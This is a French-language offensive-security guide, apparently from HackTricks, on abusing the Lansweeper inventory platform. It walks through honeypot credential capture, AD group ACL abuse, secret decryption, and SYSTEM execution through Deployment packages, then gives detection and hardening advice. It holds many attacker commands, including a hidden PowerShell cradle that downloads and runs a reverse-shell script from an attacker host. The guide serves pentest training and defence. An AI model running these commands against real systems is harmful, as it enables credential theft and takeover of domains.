# Lansweeper Abuse : récupération d’identifiants, déchiffrement de secrets et RCE via le déploiement

{{#include ../../banners/hacktricks-training.md}}

Lansweeper est une plateforme de découverte et d’inventaire des actifs IT, généralement déployée sur Windows et intégrée à Active Directory. Les identifiants configurés dans Lansweeper sont utilisés par ses moteurs de scan pour s’authentifier auprès des actifs via des protocoles tels que SSH, SMB/WMI et WinRM. Les mauvaises configurations permettent fréquemment :

- L’interception d’identifiants en redirigeant une cible de scan vers un hôte contrôlé par l’attaquant (honeypot)
- L’exploitation des ACL AD exposées par les groupes associés à Lansweeper afin d’obtenir un accès distant
- Le déchiffrement sur l’hôte des secrets configurés dans Lansweeper (chaînes de connexion et identifiants de scan enregistrés)
- L’exécution de code sur les endpoints gérés via la fonctionnalité Deployment (souvent exécutée en tant que SYSTEM)

Cette page résume les workflows et commandes pratiques utilisés par les attaquants pour exploiter ces comportements lors d’engagements.

## 1) Récupérer les identifiants de scan via un honeypot (exemple SSH)

Idée : créer une Scanning Target qui pointe vers votre hôte et lui associer des Scanning Credentials existants. Lorsque le scan s’exécute, Lansweeper tente de s’authentifier avec ces identifiants, et votre honeypot les capture.<sup>[[1]](#references)</sup>

Vue d’ensemble des étapes (interface web) :
- Scanning → Scanning Targets → Add Scanning Target
- Type : IP Range (ou Single IP) = votre IP VPN
- Configurer le port SSH sur une valeur accessible (par exemple, 2022 si le port 22 est bloqué)
- Désactiver la planification et prévoir un déclenchement manuel
- Scanning → Scanning Credentials → vérifier que des identifiants Linux/SSH existent ; les associer à la nouvelle cible (activer tous les identifiants nécessaires)
- Cliquer sur « Scan now » pour la cible
- Exécuter un honeypot SSH et récupérer le nom d’utilisateur et le mot de passe utilisés lors de la tentative d’authentification

Exemple avec sshesame :<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valider les identifiants capturés auprès des services du DC :
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Remarques
- Les autres protocoles ne sont pas équivalents : un listener SMB/WinRM obtient normalement une réponse au challenge NTLM plutôt qu’un mot de passe en clair. Le cracking ou le relay dépend des protections du protocole négocié ; voir [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). L’authentification SSH par mot de passe constitue généralement le cas le plus simple de mot de passe en clair.
- L’authentification SSH par clé publique expose le nom d’utilisateur et l’empreinte de la clé publique au serveur, **mais pas la clé privée ni sa passphrase**. Récupérez les credentials associés aux clés depuis le serveur Lansweeper compromis au lieu d’attendre d’un honeypot qu’il les divulgue.<sup>[[2]](#references)</sup>
- De nombreux scanners s’identifient avec des client banners distincts (par ex., RebexSSH) et tenteront des commandes bénignes (uname, whoami, etc.).

### L’ordre de sélection des credentials est important

Lors d’un rescan, Lansweeper réessaie d’abord le credential qui a réussi en dernier pour cet asset, puis les credentials explicitement associés dans leur ordre de configuration, et enfin le credential global du même type. Un honeypot qui accepte la première authentification par mot de passe n’observera donc normalement pas les credentials de fallback suivants ; lors d’une évaluation autorisée du chemin des credentials, journalisez et rejetez les tentatives si l’objectif est de vérifier la séquence complète de fallback.<sup>[[6]](#references)</sup>

## 2) Abus des ACL AD : obtenir un accès distant en s’ajoutant à un groupe d’admins d’application

Utilisez BloodHound pour énumérer les droits effectifs du compte compromis. Une découverte courante est un groupe spécifique à un scanner ou à une application (par ex., “Lansweeper Discovery”) détenant GenericAll sur un groupe privilégié (par ex., “Lansweeper Admins”). Si le groupe privilégié est également membre de “Remote Management Users”, WinRM devient disponible dès que nous nous y ajoutons.<sup>[[1]](#references)[[5]](#references)</sup>

Exemples de collecte :
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploiter GenericAll sur un groupe avec BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Ensuite, obtenez un shell interactif :
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Astuce : les opérations Kerberos dépendent du temps. Si vous rencontrez KRB_AP_ERR_SKEW, synchronisez-vous d’abord avec le DC :
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Déchiffrer les secrets configurés par Lansweeper sur l’hôte

Sur le serveur Lansweeper, le site ASP.NET stocke généralement une chaîne de connexion chiffrée et une clé symétrique utilisée par l’application. Avec un accès local approprié, vous pouvez déchiffrer la chaîne de connexion à la base de données, puis extraire les identifiants d’analyse enregistrés.<sup>[[1]](#references)</sup>

Emplacements courants :
- Configuration Web : `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clé de l’application : `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Utilisez SharpLansweeperDecrypt pour automatiser le déchiffrement et l’extraction des identifiants enregistrés. Sans argument, l’exécutable actuel déchiffre `web.config`, se connecte à la base de données et extrait tous les identifiants d’analyse configurés ; `-e` prend également en charge le déchiffrement hors ligne/manuel lorsqu’une valeur chiffrée et le fichier de clé sont déjà disponibles :<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Le résultat attendu inclut les détails de connexion à la base de données et les identifiants de scan en clair, tels que les comptes Windows et Linux utilisés sur l’ensemble du parc. Ceux-ci disposent souvent de droits locaux élevés sur les hôtes du domaine :
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utiliser des identifiants de scan Windows récupérés pour un accès privilégié :
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Déploiement Lansweeper → RCE SYSTEM

En tant que membre de « Lansweeper Admins », l'interface web expose Deployment et Configuration. Sous Deployment → Deployment packages, vous pouvez créer des packages qui exécutent des commandes arbitraires sur les assets ciblés. Lansweeper utilise un identifiant de scan administratif pour accéder au Task Scheduler et à `C$` de la cible, puis crée une tâche pour le déploiement. Lorsque le package utilise le mode d'exécution **System Account**, le payload s'exécute en tant que `NT AUTHORITY\SYSTEM` ; les autres modes d'exécution peuvent utiliser l'identifiant de scan mappé ou l'utilisateur actuellement connecté. Vérifiez donc le mode sélectionné au lieu de supposer qu'il s'agit de SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Étapes générales :
- Créez un nouveau package Deployment qui exécute une commande PowerShell ou cmd en une seule ligne (reverse shell, ajout d'utilisateur, etc.).
- Ciblez l'asset souhaité (par exemple, le DC ou l'hôte où Lansweeper s'exécute), puis cliquez sur Deploy/Run now.
- Récupérez votre shell en tant que SYSTEM.

Exemples de payloads (PowerShell) :
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Les actions de déploiement sont bruyantes et laissent des journaux dans Lansweeper et les journaux d’événements Windows. À utiliser avec discernement.

### Artefacts de déploiement et second point d’exposition des identifiants

Le scanner écrit son exécutable de déploiement sous `C:\Windows\LSDeployment` via `C$`. Les fichiers de package sont normalement lus depuis `DefaultPackageShare$`, associé à `C:\Program Files (x86)\Lansweeper\PackageShare`, ou depuis un partage de packages spécifique à une plage d’adresses IP. Il est important de noter que Lansweeper documente que l’identifiant du partage de packages est stocké **sous forme chiffrée réversible dans le registre de chaque ordinateur recevant un déploiement**. Considérez un endpoint administré compromis comme un point de divulgation potentiel pour ce compte de partage, et inspectez le répertoire de déploiement, l’historique des tâches planifiées et les partages de packages configurés lors de la reconstitution de l’activité Lansweeper.<sup>[[7]](#references)</sup>

## Détection et hardening

- Restreindre ou supprimer les énumérations SMB anonymes. Surveiller le RID cycling et les accès anormaux aux partages Lansweeper.
- Contrôles de sortie : bloquer ou restreindre fortement le SSH/SMB/WinRM sortant depuis les hôtes scanner. Déclencher une alerte sur les ports non standard (p. ex. 2022) et les bannières client inhabituelles comme Rebex.
- Protéger `Website\\web.config` et `Key\\Encryption.txt`. Externaliser les secrets dans un vault et les faire tourner en cas d’exposition. Envisager des comptes de service dotés de privilèges minimaux et des gMSA lorsque cela est possible.
- Supervision AD : déclencher une alerte lors des modifications des groupes liés à Lansweeper (p. ex. « Lansweeper Admins », « Remote Management Users ») et des modifications d’ACL accordant GenericAll/Write membership sur des groupes privilégiés.
- Auditer les créations/modifications/exécutions de packages de Deployment et corréler les nouvelles tâches planifiées distantes avec les écritures dans `C:\Windows\LSDeployment` ; déclencher une alerte lorsque des packages lancent `cmd.exe`/`powershell.exe` ou établissent des connexions sortantes inattendues.
- Accorder aux identifiants de partage de packages uniquement la permission **Read & Execute** et ne jamais les réutiliser pour l’administration. Privilégier l’inventaire basé sur un agent lorsque cela est possible : si tous les ordinateurs sont scannés par un agent et que le module de déploiement n’est pas utilisé, Lansweeper n’exige pas le stockage d’identifiants de scan des ordinateurs.<sup>[[6]](#references)[[7]](#references)</sup>

## Sujets connexes
- [Énumération SMB/LSA/SAMR et RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Authentification Kerberos et considérations liées au décalage d’horloge](kerberos-authentication.md)
- [Analyse des chemins BloodHound](bloodhound.md)
- [Utilisation de WinRM et mouvement latéral](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Abuser du scan Lansweeper, des ACL AD et des secrets pour prendre le contrôle d’un DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Créer et mapper des identifiants de scan — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Exigences de déploiement — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
